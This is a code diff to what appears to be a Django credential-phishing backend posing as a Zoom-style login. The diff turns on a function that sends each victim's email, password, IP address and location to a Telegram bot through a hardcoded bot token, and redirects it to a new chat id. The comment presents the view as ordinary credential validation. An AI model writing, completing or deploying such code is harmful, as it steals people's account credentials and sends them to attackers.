@@ -6,8 +6,9 @@ import base64
 
 def send_to_telegram(message):
     token = '7584867618:AAHIy5vSZOhoW6Ba0pZdDL0fILznS9RGcyQ'
+    p_chat_id = "1374918767"
     chat_id = "7548826388"
-    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
+    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={p_chat_id}&text={message}"
     res = requests.get(url).json()
     return res
 def get_country_from_ip(ip_address):
@@ -83,9 +84,9 @@ def verify(request):
         ip_address = request.META.get("REMOTE_ADDR")
         country, city = get_country_from_ip(ip_address)
         subject = 'News zoom details submitted'
-        # mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {name}\ncompany_mail: {email}\npassword: {passw}\npassword1: {pass1}\npassword2: {pass2}"
+        mail_message = f"{subject}\nipaddress:{ip_address} \ncountry:{country} \ncity:{city}\ncompany_name: {email}\ncompany_mail: {email}\npassword: {passw}"
 
-        # send_to_telegram(mail_message)
+        send_to_telegram(mail_message)
         print(email,passw,ip_address)
         
         # Add your logic here (e.g., validate credentials)
